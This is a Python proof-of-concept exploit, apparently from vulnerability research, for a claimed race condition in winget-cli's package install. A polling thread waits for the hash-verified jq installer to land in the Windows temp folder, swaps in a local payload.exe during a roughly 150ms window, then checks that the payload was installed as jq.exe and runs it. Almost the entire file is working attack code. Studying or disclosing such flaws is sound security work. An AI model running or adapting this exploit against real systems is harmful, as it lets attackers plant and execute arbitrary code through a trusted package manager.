"""
TOCTOU Race Condition POC - winget-cli v1.28.240
================================================
Security researcher | V5iix

Objective: To prove that winget executes/moves the replaced file
after hash verification without re-verification.

From  logs:

21:57:48.966 → Installer hash verified

21:57:48.983 → Renamed to: jq-windows-amd64.exe ← Start replacement here

21:57:49.135 → Moving to install location ← 152ms window
"""

import threading
import subprocess
import shutil
import os
import sys
import time
import hashlib


WINGET   = os.path.expandvars(
    r"%LOCALAPPDATA%\Microsoft\WindowsApps\winget.exe")
PAYLOAD  = r"C:\poc_winget\payload\payload.exe"
PROOF    = r"C:\poc_winget\TOCTOU_EXECUTION_PROOF.txt"

TARGET_DIR  = r"C:\Windows\Temp\WinGet\jqlang.jq.1.8.1"
TARGET_FILE = os.path.join(TARGET_DIR, "jq-windows-amd64.exe")

INSTALL_DEST = os.path.expandvars(
    r"%LOCALAPPDATA%\Microsoft\WinGet\Packages"
    r"\jqlang.jq_Microsoft.Winget.Source_8wekyb3d8bbwe\jq.exe")

POLL_INTERVAL = 0.001   # 1ms polling

state = {
    "install_done":   threading.Event(),
    "race_won":       threading.Event(),
    "replaced_at":    None,
    "found_at":       None,
    "replace_error":  None,
}

log_lock = threading.Lock()

def log(msg):
    ts = time.strftime("%H:%M:%S") + f".{int((time.time()%1)*1000):03d}"
    with log_lock:
        print(f"[{ts}] {msg}", flush=True)

def race_thread():
    log("RACE  | Thread started - watching for target file")
    deadline = time.time() + 120

    while time.time() < deadline:
        if state["install_done"].is_set():
            log("RACE  | Install done before replacement - LOST")
            return

        if os.path.exists(TARGET_FILE):
            state["found_at"] = time.time()
            sz = os.path.getsize(TARGET_FILE)
            log(f"RACE  | FILE FOUND: {TARGET_FILE} ({sz} bytes)")

        
            for attempt in range(50):
                try:
                    shutil.copy2(PAYLOAD, TARGET_FILE)
                    state["replaced_at"] = time.time()
                    new_sz = os.path.getsize(TARGET_FILE)
                    log(f"RACE  | REPLACED! attempt={attempt+1} new_size={new_sz}b")
                    state["race_won"].set()
                    return
                except Exception as e:
                    if attempt == 0:
                        log(f"RACE  | Replace attempt {attempt+1} failed: {e}")
                    time.sleep(0.0005)  

            state["replace_error"] = "All 50 attempts failed"
            log(f"RACE  | All replace attempts FAILED")
            return

        time.sleep(POLL_INTERVAL)

    log("RACE  | TIMEOUT (120s)")


def install_thread():
    log("INST  | Starting: winget install jqlang.jq")
    try:
        result = subprocess.run(
            [WINGET, "install", "--id", "jqlang.jq",
             "--accept-package-agreements", "--scope", "user"],
            capture_output=True, text=True, timeout=120
        )
        log(f"INST  | Exit code: {result.returncode}")
        for line in result.stdout.splitlines():
            if any(k in line.lower() for k in
                   ["hash","verified","install","success","error","moving","fail"]):
                log(f"INST  | {line.strip()}")
    except Exception as e:
        log(f"INST  | ERROR: {e}")
    finally:
        state["install_done"].set()


# ============================================================
#  MAIN
# ============================================================
def main():
    print("=" * 60)
    print("TOCTOU POC - winget-cli - Security researcher | V5iix")
    print("=" * 60)

    #Check the payload
    if not os.path.exists(PAYLOAD):
        print(f"[-] Payload not found: {PAYLOAD}")
        sys.exit(1)

    payload_sz = os.path.getsize(PAYLOAD)
    log(f"INIT  | Payload: {PAYLOAD} ({payload_sz} bytes)")

   # cleaning
    log("INIT  | Uninstalling existing jq...")
    subprocess.run([WINGET, "uninstall", "--id", "jqlang.jq"],
                   capture_output=True, timeout=30)
    
    # Delete the old temp dir
    if os.path.exists(TARGET_DIR):
        shutil.rmtree(TARGET_DIR, ignore_errors=True)
        log(f"INIT  | Cleared: {TARGET_DIR}")

    if os.path.exists(PROOF):
        os.remove(PROOF)

    log(f"INIT  | Target file: {TARGET_FILE}")
    log(f"INIT  | Poll interval: {POLL_INTERVAL*1000:.0f}ms")
    print("-" * 60)

   # Run the threads
    t_race    = threading.Thread(target=race_thread,   daemon=True)
    t_install = threading.Thread(target=install_thread, daemon=True)

    t_race.start()
    time.sleep(0.1)        #Give the race thread time to prepare.
    t_install.start()
    
    # Wait for both of them
    t_install.join(timeout=130)
    t_race.join(timeout=10)

    print("\n" + "=" * 60)
    print("RESULTS")
    print("=" * 60)

   # ============================================================
   #                  Result Analysis
   # =========================================================
    if not os.path.exists(INSTALL_DEST):
        log("RESULT| Install destination not found - install may have failed")
        return

    installed_sz   = os.path.getsize(INSTALL_DEST)
    installed_hash = _sha256(INSTALL_DEST)
    payload_hash   = _sha256(PAYLOAD)

    log(f"RESULT| Installed file : {INSTALL_DEST}")
    log(f"RESULT| Installed size : {installed_sz} bytes")
    log(f"RESULT| Payload size   : {payload_sz} bytes")
    log(f"RESULT| Installed SHA256: {installed_hash[:16]}...")
    log(f"RESULT| Payload SHA256  : {payload_hash[:16]}...")

    if installed_hash == payload_hash:
        print("\n" + "!" * 60)
        print("TOCTOU CONFIRMED - PAYLOAD INSTALLED AS jq.exe")
        print("!" * 60)
        log("RESULT| Running payload to confirm execution...")
        result = subprocess.run([INSTALL_DEST], capture_output=True, timeout=10)
        if os.path.exists(PROOF):
            print("\n[EXECUTION PROOF]")
            print(open(PROOF).read())
        else:
            print(f"[-] Payload ran but no proof file (exit={result.returncode})")
    else:
        print("\n[-] Legitimate jq.exe installed")
        if state["race_won"].is_set():
            log("RESULT| Race won but file was overwritten again by winget")
            log("RESULT| → winget may have re-verified OR replaced after our copy")
        else:
            log("RESULT| Race NOT won - timing too tight")
            log("RESULT| Recommendation: run multiple times / increase system load")


def _sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


if __name__ == "__main__":
    main()
